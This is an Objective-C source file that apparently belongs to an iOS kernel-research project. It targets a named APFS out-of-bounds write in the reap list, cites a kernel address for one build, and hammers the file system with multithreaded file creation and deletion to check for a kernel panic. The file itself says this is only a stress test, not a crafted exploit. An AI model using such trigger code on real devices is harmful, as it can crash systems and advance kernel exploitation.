//
//  P054APFSReapList.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 9/18/26.
//


//
//  P054APFSReapList.m
//  CVE-2026-28968: APFS reap list OOB write during file deletion
//  Target: apfs_reap_list_walk 0xfffffff009c371b4 (23F77)
//  Trigger: Rapid file create + unlink on APFS container
//

#import "P054APFSReapList.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <errno.h>
#import <sys/stat.h>
#import <pthread.h>
#import <stdarg.h>

#define P054_BUILD @"p054-apfs-reap-list-v1"

static volatile int p054_stop = 0;
static int g_log_fd = -1;

static void p054_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_log_fd, s, strlen(s));
            fcntl(g_log_fd, F_FULLFSYNC);
        }
    }
}

static void *p054_delete_thread(void *arg) {
    NSString *dir = (__bridge NSString *)arg;
    int count = 0;
    int cycle = 0;
    while (!p054_stop) {
        for (int i = 0; i < 500; i++) {
            NSString *path = [dir stringByAppendingPathComponent:[NSString stringWithFormat:@"p054_file_%d", i]];
            int fd = open([path UTF8String], O_CREAT | O_RDWR, 0644);
            if (fd >= 0) {
                write(fd, "A", 1);
                close(fd);
            }
        }
        for (int i = 0; i < 500; i++) {
            NSString *path = [dir stringByAppendingPathComponent:[NSString stringWithFormat:@"p054_file_%d", i]];
            unlink([path UTF8String]);
            count++;
        }
        cycle++;
    }
    p054_log(nil, @"  [thread] unlinks=%d cycles=%d", count, cycle);
    return NULL;
}

@implementation P054APFSReapList

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p054_reap_list_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p054_log(log, @"=== p054 session BUILD %@ ===", P054_BUILD);
    p054_log(log, @"23F77 apfs_reap_list_walk 0xfffffff009c371b4 (pack 80 / 28968 MAP)");
    p054_log(log, @"This tap is unlink occupancy for 30s. NOT a crafted nrl_entries OOB.");
    p054_log(log, @"No panic expected from volume of unlinks. 28968 dest still unnamed.");
    p054_log(log, @"");
    p054_stop = 0;
    
    /* Create 4 subdirectories to stress the APFS reap list */
    NSMutableArray *dirs = [NSMutableArray array];
    for (int d = 0; d < 4; d++) {
        NSString *dirPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"p054_dir_%d", d]];
        mkdir([dirPath UTF8String], 0755);
        [dirs addObject:dirPath];
    }
    
    p054_log(log, @"[*] Starting 4 threads × 500 files create/delete loop (30s)...");
    
    pthread_t tids[4];
    for (int i = 0; i < 4; i++) {
        pthread_create(&tids[i], NULL, p054_delete_thread, (__bridge void *)dirs[i]);
    }
    
    for (int t = 5; t <= 30; t += 5) {
        sleep(5);
        p054_log(log, @"[race] t=%ds", t);
    }
    
    p054_stop = 1;
    for (int i = 0; i < 4; i++) pthread_join(tids[i], NULL);
    
    /* Cleanup */
    for (NSString *dir in dirs) {
        NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
        for (NSString *file in files) {
            unlink([[dir stringByAppendingPathComponent:file] UTF8String]);
        }
        rmdir([dir UTF8String]);
    }
    
    p054_log(log, @"");
    p054_log(log, @"=== VERDICT ===");
    p054_log(log, @"If device panicked: check for apfs_reap_list_walk in panic log");
    p054_log(log, @"If no panic: need different file operation or volume");
    
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    
    return log;
}

@end